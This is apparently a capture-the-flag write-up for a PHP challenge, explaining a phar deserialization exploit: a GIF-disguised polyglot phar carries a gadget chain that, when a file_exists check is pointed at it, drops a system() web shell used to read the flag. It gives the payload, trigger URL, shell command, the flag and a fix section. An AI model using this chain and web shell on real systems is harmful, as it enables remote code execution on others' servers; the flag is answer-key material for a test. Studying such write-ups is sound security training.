# 04 · phar-image (hard)

Two features: an avatar upload that only accepts files starting with
`GIF89a`/`GIF87a`, and an "avatar exists?" check that runs
`file_exists($_GET['check'])` on the raw value. A stat function taking a raw path
accepts stream wrappers — including `phar://`.

## Vulnerability
In PHP ≤ 7.4, filesystem/stat functions given a `phar://` path parse the archive
and unserialize its metadata. The app ships a POP gadget chain (`gadgets.php`):
```php
class Template { public $engine; function __destruct(){ $this->engine->render(); } }
class Renderer { public $out, $tpl; function render(){ file_put_contents($this->out,$this->tpl); } }
```
A crafted metadata object graph turns "stat a file" into an arbitrary file write.

## Exploitation
1. Build a polyglot phar whose stub starts with `GIF89a` (to pass the image
   filter) and whose metadata is
   `Template{engine: Renderer{out:'/var/www/html/uploads/sh.php', tpl:'<?php system($_GET["c"]);?>'}}`.
   Build with `php -d phar.readonly=0 build_phar.php`, rename to `evil.gif`.
2. Upload it as an avatar — the magic bytes pass.
3. Trigger deserialization: `?check=phar://uploads/evil.gif/x.txt`. On destruction
   the chain writes `uploads/sh.php`.
4. Run the dropped shell: `GET /uploads/sh.php?c=cat /flag.txt`.

See `solve/` for `build_phar.php` and `solve.sh`.

## Flag
```
SecurinetsENIT{th3_r34d_pr1m1t1v3_w4s_th3_rc3_4ll_4l0ng}
```

## Fix
Never pass user input to filesystem functions as a raw path, and deny stream
wrappers. Validate uploads by content and extension, and store them outside any
path a wrapper can reach.
